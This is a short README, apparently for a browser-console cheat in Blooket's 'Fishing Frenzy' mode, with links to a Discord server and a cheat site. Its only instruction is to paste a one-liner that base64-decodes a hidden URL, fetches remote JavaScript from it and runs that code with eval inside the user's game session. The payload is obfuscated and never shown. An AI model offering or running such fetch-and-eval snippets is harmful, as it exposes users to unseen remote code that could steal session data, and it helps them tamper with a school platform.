**Discord server: https://discord.gg/K5xUbuDqmG**

**These bookmarklets are also on: https://schoolcheats.net/blooket**

# fishing-frenzy

This cheat only works in fishing frenzy game mode!

# setWeight.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2Zpc2hpbmdGcmVuenlTZXRXZWlnaHQuanM=')).then((res) => res.text().then((t) => eval(t)))
```
